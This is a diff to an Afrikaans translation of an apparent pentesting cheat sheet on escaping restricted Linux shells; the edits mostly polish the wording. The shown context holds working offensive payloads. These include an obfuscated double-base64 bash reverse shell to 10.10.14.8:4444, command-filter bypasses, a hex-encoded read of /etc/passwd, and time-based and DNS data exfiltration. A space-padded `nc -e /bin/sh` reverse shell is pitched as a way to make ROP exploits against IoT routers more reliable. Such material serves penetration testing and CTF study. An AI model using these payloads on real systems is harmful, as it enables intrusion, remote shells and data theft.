@@ -4,7 +4,7 @@
 
 ## Algemene Beperkings Bypasses
 
-### Terugskakel Shell
+### Omgekeerde Skulp
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Om te verbygaan verbode spasie
+### Om verbode spasie te omseil
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -129,7 +129,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Tydgebaseerde data-uitvoer
+### Tydgebaseerde data-uitvloeiing
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -140,11 +140,11 @@ echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-Jy kan **burpcollab** of [**pingb**](http://pingb.in) gebruik byvoorbeeld.
+Jy kan **burpcollab** of [**pingb**](http://pingb.in) gebruik, byvoorbeeld.
 
 ### Builtins
 
-In die geval dat jy nie eksterne funksies kan uitvoer nie en slegs toegang het tot 'n **beperkte stel builtins om RCE te verkry**, is daar 'n paar handige truuks om dit te doen. Gewoonlik **sal jy nie al die** **builtins** kan gebruik nie, so jy moet **al jou opsies ken** om te probeer om die tronk te omseil. Idee van [**devploit**](https://twitter.com/devploit).\
+In die geval dat jy nie eksterne funksies kan uitvoer nie en net toegang het tot 'n **beperkte stel builtins om RCE te verkry**, is daar 'n paar handige truuks om dit te doen. Gewoonlik **sal jy nie al die** **builtins** kan gebruik nie, so jy moet **al jou opsies ken** om te probeer om die tronk te omseil. Idee van [**devploit**](https://twitter.com/devploit).\
 Eerstens, kyk na al die [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Dan het jy hier 'n paar **aanbevelings**:
 ```bash
 # Get list of builtins
@@ -298,11 +298,13 @@ ln /f*
 
 As jy binne 'n lêerstelsel is met die **lees-alleen en geen uitvoering beskerming** of selfs in 'n distroless houer, is daar steeds maniere om **arbitraire binêre lêers uit te voer, selfs 'n shell!:**
 
+
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Chroot & ander Jails Bypass
+
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
@@ -318,15 +320,15 @@ Daarom kan jy 'n *NOP sled vir Bash* skep deur jou werklike opdrag te prefix met
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-As 'n ROP-ketting (of enige geheue-korrupsie-primitief) die instruksie-aanwyser enige plek binne die ruimteblok land, sal die Bash-pars eenvoudig die spasie oorslaan totdat dit by `nc` kom, wat jou opdrag betroubaar uitvoer.
+As 'n ROP-ketting (of enige geheue-korrupsie-primitief) die instruksie-aanwyser enige plek binne die ruimteblok land, sal die Bash-parsser eenvoudig die spasie oorslaan totdat dit by `nc` kom, wat jou opdrag betroubaar uitvoer.
 
 Praktiese gebruiksgevalle:
 
 1. **Geheue-gemapte konfigurasie-blobs** (bv. NVRAM) wat oor prosesse toeganklik is.
-2. Situasies waar die aanvaller nie NULL-byte kan skryf om die payload te belyn nie.
+2. Situasies waar die aanvaller nie NULL-byte kan skryf om die las te belyn nie.
 3. Ingebedde toestelle waar slegs BusyBox `ash`/`sh` beskikbaar is – hulle ignoreer ook lei-spasies.
 
-> 🛠️  Kombineer hierdie truuk met ROP gadgets wat `system()` aanroep om die eksploit se betroubaarheid op geheue-beperkte IoT-roeters dramaties te verhoog.
+> 🛠️  Kombineer hierdie truuk met ROP-gadgets wat `system()` aanroep om die betroubaarheid van die ontploffing op geheue-beperkte IoT-roeters dramaties te verhoog.
 
 ## Verwysings & Meer
 
